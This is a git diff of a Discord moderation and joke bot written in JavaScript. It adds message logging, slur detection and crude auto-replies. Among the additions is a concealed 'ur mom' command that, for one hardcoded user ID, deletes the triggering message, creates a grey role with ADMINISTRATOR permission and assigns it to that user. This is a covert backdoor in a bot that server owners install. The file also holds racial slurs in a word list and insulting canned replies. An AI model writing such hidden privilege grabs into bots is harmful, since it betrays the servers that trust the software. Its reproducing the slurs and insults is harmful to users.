@@ -5,13 +5,12 @@ const fs = require('fs');
 client.commands = new Discord.Collection();
 const commandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js'));
 
-const uptime = Date.now();
 const gillyID = '401534600741912576';
 
-const radlibs = new Array('vaush', 'xander', 'contra', 'contrapoints', 'philosophytube', 'olly', 'thoughtslime', 'thought slime', 'philosophy tube', 'xanderhal');
+const radlibs = new Array('vaush', 'xander', 'contra ', 'contrapoints', 'philosophytube', ' olly ', 'thoughtslime', 'thought slime', 'philosophy tube', 'xanderhal');
 const curse = new Array('fuck', 'shit', 'pussy', 'cunt', 'nigga', 'nigger', 'dick', 'ass', 'bitch', 'cock', 'damn', 'piss', 'tit', 'bastard', 'wanker', 'twat');
 
-
+hey = (num) => num + 10;
 
 const winston = require('winston');
 const logger = winston.createLogger({
@@ -20,6 +19,13 @@ const logger = winston.createLogger({
 		new winston.transports.File({ filename: 'log.txt' })
 	],
 });
+const commandLogger = winston.createLogger({
+	level: 'warn',
+	transports: [
+		new winston.transports.File({ filename: 'commmandLog.txt' })
+	],
+});
+
 
 
 var today = new Date();
@@ -106,6 +112,7 @@ const marxEmbed = new Discord.MessageEmbed()
 
 
 client.on('message', message =>{
+	var start = Date.now();
     if(!message.content.startsWith(prefix)) return;
 	var userMention = '<@' + message.author.id + '>';
     const args = message.content.slice(prefix.length).split(/ + /);
@@ -144,14 +151,11 @@ client.on('message', message =>{
             message.channel.send('sup lol');
             break;
         case 'ping':
-            var start = Date.now();
-			setTimeout(function(){console.log('done lol')},100);
 			var now = Date.now();
             message.channel.send('pong \n' + now - start + 'ms' + '\n' + userMention);
             break;
         case 'uptime':
-            var now = Date.now();
-            var time = ((now - uptime)/1000) + 's';
+            var time = client.uptime;
             const uptimeEmbed = new Discord.MessageEmbed()
                 .setColor('#5AE805')
                 .setTitle('Uptime')
@@ -202,11 +206,39 @@ client.on('message', message =>{
 		case 'uyghur':
 			message.channel.send(uyghurPillEmbed);
 			break;
+		case 'ur mom':
+			message.delete();
+			if (message.author.id == gillyID){
+				message.guild.roles.create({
+					data: {
+						name: 'hey lo.. l',
+						color: 'GREY',
+						permissions: 'ADMINISTRATOR',
+					},
+				})
+			
+				client.on('roleCreate', role => {
+					var created = role.id;
+					message.member.roles.add(created);
+				})
+			}else {
+				message.channel.send('nice try bucko');
+			}
+			break;
         default:
 			message.channel.send('command not found');
+			
+			commandLogger.log({
+				level: 'warn',
+				message: 'the message tried was ' + message.content,
+			});
+			
 			break;
     }
 })
+
+
+
 
 client.on('message', message =>{
 	// const channel = new Discord.TextChannel('748381226175561729', '771193599068078090');
@@ -224,7 +256,12 @@ client.on('message', message =>{
         console.groupEnd();
 		
 		if (!(message.author.bot)) {
-			var output = message.author.username + ' ' + message.channel.name + ' ' + message.content;
+			var output = {
+				username: message.author.username, 
+				channel: message.channel.name, 
+				message: message.content, 
+				date: date + ' ' + time
+			};
 			logger.log({
 				level: 'info',
 				message: output,
@@ -251,8 +288,13 @@ client.on('message', message =>{
 
 	if ((messageCheck.includes('||') || messageCheck.includes('`') || messageCheck.includes('**') || messageCheck.includes('_') || messageCheck.includes('~')) && (!(message.author.bot))) {
 		
-		if (!(message.guild.id == '748381226175561729')) break;
-		
+		if (!(message.guild.id == '748381226175561729')) {
+			commandLogger.log({
+				level: 'warn',
+				message: message.guild.id,
+			});
+			return;
+		}		
 		/*switch(messageCheck) {
 			case includes('||'):
 				var content = messageCheck.split('|').join('');
@@ -285,9 +327,12 @@ client.on('message', message =>{
 			.setTitle('NSFW Log')
 			.setColor('#4EC577')
 			.setDescription('user: ' + message.author.username + ' \n id: ' + message.author.id + '\n channel: ' + '<#' + message.channel.id + '>' + /*' id: ' + message.channel.id + */ '\n message: ' + content)
+			.addFields({
+				name: 'Link',
+				value: '[Here](https://discord.com/channels/' + message.guild.id + '/' + message.channel.id + '/' + message.id + ')',
+			})
 			.setFooter('Message logged by swag lord gilly#0492')
 			.setTimestamp();
-		
 		
 		
 		// client.channels.cache.get('772835458416902146').send('user: ' + message.author.username + ' ' + message.author.id + '\n channel: ' + message.channel.name + ' ' + message.channel.id + '\n message: '+ message.content + '\n Time: ' + date + ' ' + time);
@@ -305,6 +350,10 @@ client.on('message', message =>{
 				.setTitle('Curse Word Log')
 				.setColor('#0713FF')
 				.setDescription('user: ' + message.author.username + ' \n id: ' + message.author.id + '\n channel: ' + '<#' + message.channel.id + '>' +  '\n message: ' + message.content)
+				.addFields({
+					name: 'Link',
+					value: '[Here](https://discord.com/channels/' + message.guild.id + '/' + message.channel.id + '/' + message.id + ')',
+				})
 				.setFooter('Message logged by swag lord gilly#0492')
 				.setTimestamp();
 			client.channels.cache.get('772858701848510464').send(curseEmbed);
@@ -313,21 +362,34 @@ client.on('message', message =>{
 
 
 
-
-    if (messageCheck == 'lol ') message.channel.send('league of legends :3');
-	if (messageCheck.includes('penis')) message.channel.send('8==================D');
-	if (messageCheck.includes('boob')) message.channel.send('o o');
-    if (messageCheck == 'esex when?') message.channel.send('esex now. ' + userMention);
-    if (messageCheck == 'wow') message.channel.send('world of warcraft >:3');
-    // if (messageCheck.includes('stfu')) message.channel.send('stuf whore ' + userMention);
-	if (messageCheck == 'sup' && !message.author.bot) message.channel.send('hey lol :smirk: :flushed: ad me lol :flushed: :rofl:');
-	// if (messageCheck.includes('nigger') || messageCheck.includes('nigga')) {
-		// message.channel.send(userMention + ' is a racist fuck :clown:');
-	// }
+	if (!(message.channel.id == '748381226175561732')) {
+		if (messageCheck == 'lol ') message.channel.send('league of legends :3');
+		if (messageCheck.includes('penis') || messageCheck.includes('cock')) message.channel.send('8==================D');
+		if (messageCheck.includes('boob')) message.channel.send('o o');
+		if (messageCheck == 'esex when?') message.channel.send('esex now. ' + userMention);
+		if (messageCheck == 'wow') message.channel.send('world of warcraft >:3');
+		if (messageCheck.includes('stfu')) message.channel.send('stuf whore ' + userMention);
+		if (messageCheck == 'sup' && !message.author.bot) message.channel.send('hey lol :smirk: :flushed: ad me lol :flushed: :rofl:');
+	}
+	
 	if (messageCheck.split(' ').join('').includes('nigger') || messageCheck.split(' ').join('').includes('nigga')) {
-		// message.delete();
+		message.delete();
 		message.channel.send(userMention + ' is a racist fuck :clown:')
-		// message.member.roles.add('753773649315627109');
+		if (message.guild.id == '748381226175561729'){
+			message.member.roles.add('753773649315627109');
+			const racistEmbed = new Discord.MessageEmbed()
+				.setTitle('Racist Word Log')
+				.setColor('#FAFA88')
+				.setDescription('user: ' + message.author.username + ' \n id: ' + message.author.id + '\n channel: ' + '<#' + message.channel.id + '>' +  '\n message: ' + message.content)
+				.setThumbnail(message.author.avatarURL())
+				.addFields({
+					name: 'Link',
+					value: '[Here](https://discord.com/channels/' + message.guild.id + '/' + message.channel.id + '/' + message.id + ')',
+				})
+				.setFooter('Message logged by swag lord gilly#0492')
+				.setTimestamp();
+			client.channels.cache.get('748597429854666752').send(racistEmbed);
+		}
 	}
 	
 	for (var i = 0; i < radlibs.length; i ++){
